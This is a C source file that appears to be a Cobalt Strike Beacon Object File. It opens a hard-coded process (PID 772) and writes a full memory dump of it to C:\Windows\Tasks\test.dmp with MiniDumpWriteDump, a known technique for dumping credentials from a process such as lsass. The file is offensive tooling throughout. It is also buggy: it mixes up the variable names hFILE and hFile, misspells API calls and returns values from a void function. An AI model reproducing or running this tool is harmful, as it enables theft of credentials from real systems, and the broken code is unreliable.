#include <windows.h>
#include <dbghelp.h>
#include <stdio.h>
#include <stdlib.h>
#include "beacon.h"

#pragma comment(lib, "DbgHelp")
#pragma comment(lib, "dbghelp")
#pragma comment(lib, "dbgcore")

WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileW(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dsShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDispoition, DWORD dwFlagsAndAttriutes, HANDLE hTemplateFile);
WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(DWORD dwDesiredAccess, WINBOOL bInherithandle, DWORD dwProcessId);
WINBASEAPI WINBOOL WINAPI DBGHELP$MiniDumpWriteDump(HANDLE, hProcess, DWORD ProcessId, HANDLE hFile, MINIDUMP_TYPE DumpType, CONST PMINIDUMP_EXCEPTION_INFORMATION ExceptionParam, CONST PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, CONST PMINIDUMP_CALLBACK_INFORMATION CallbackParam);
WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);
WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(VOID);

void go(char * args, int alen) {
    SECURITY_ATTRIBUTES sa = { sizeof(sa) };
    HANDLE hFILE = KERNEL32$CreateFileW(L"C:\\Windows\\Tasks\\test.dmp", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, &sa, CREATE_NEW, 0x80, NULL);
    if(hFile == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to get file hadle: (%u)\n", KERNEL32$GetLasError());
        KERNEL32$CloseHandle(hFile);
        return 1;
    }

    HANDLE hProcess = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, 772);

    if(!hProcess) {
        BeaconPrintf(CALLBACK_ERROR, "Failed to open process: (%u)\n", KERNEL32$GetLasError());
        KERNEL32$CloseHandle(hProcess);
        return 1;
    }

    BOOL dumped = DBGHELP$MiniDumpWriteDump(hProcess, 772, hFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
    if(dumped) {
        BeaconPrintf(CALLBACK_OUTPUT, "Success! Check C:\\Windows\\Tasks folder!\n");
    }

    KERNEL32$CloseHandle(hFile);
    KERNEL32$Closehandle(hProcess);
    return 0;
}